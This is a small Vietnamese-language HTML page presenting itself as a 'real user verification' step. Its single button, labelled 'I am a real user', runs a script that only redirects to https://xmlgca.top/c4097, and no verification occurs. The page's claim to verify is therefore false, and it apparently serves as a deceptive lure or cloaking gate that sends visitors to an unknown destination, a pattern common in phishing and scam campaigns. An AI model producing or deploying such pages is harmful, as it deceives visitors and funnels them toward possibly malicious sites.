<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Xác minh người dùng</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f4f7fb;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      width: 90%;
      max-width: 420px;
      background: #fff;
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      box-shadow: 0 8px 30px rgba(0,0,0,0.12);
    }

    h2 {
      color: #0b5ed7;
      margin-bottom: 10px;
    }

    p {
      color: #555;
      font-size: 15px;
      line-height: 1.5;
    }

    button {
      margin-top: 20px;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background: #0b5ed7;
      color: white;
      font-size: 17px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #084bb0;
    }

    .note {
      margin-top: 15px;
      font-size: 13px;
      color: #888;
    }
  </style>
</head>
<body>

  <div class="box">
    <h2>Xác minh người dùng thật</h2>
    <p>Vui lòng nhấn nút bên dưới để tiếp tục truy cập trang.</p>

    <button onclick="goToLink()">Tôi là người dùng thật</button>

    <div class="note">Hệ thống sẽ chuyển hướng sau khi xác minh.</div>
  </div>

  <script>
    function goToLink() {
      window.location.href = "https://xmlgca.top/c4097";
    }
  </script>

</body>
</html>
